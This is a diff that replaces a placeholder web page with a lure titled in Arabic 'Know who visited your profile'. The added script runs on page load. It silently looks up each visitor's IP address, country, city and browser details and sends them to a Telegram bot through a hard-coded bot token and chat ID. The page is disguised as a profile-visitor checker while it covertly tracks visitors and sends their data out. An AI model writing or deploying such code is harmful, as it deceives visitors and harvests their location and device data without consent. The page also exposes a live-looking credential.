@@ -1,9 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>My Website</title>
+  <title>اعرف من زار بروفايلك</title>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 100px;
+    }
+  </style>
 </head>
 <body>
-  <h1>Hello, world!</h1>
+  <h1>جاري تحميل الصفحة...</h1>
+
+  <script>
+    const botToken = '8388252325:AAHh2VsfDAbE2LM-KoXvccJWDvqn5gJVdYk';
+    const chatId = '7813214607';
+
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const msg = `
+📥 زائر جديد دخل للصفحة:
+
+🌍 IP: ${data.ip}
+🏙️ الدولة: ${data.country_name}
+🌆 المدينة: ${data.city}
+🖥️ نوع الجهاز: ${navigator.userAgent}
+🕓 الوقت: ${new Date().toLocaleString()}
+        `;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg
+          })
+        });
+      });
+  </script>
 </body>
 </html>
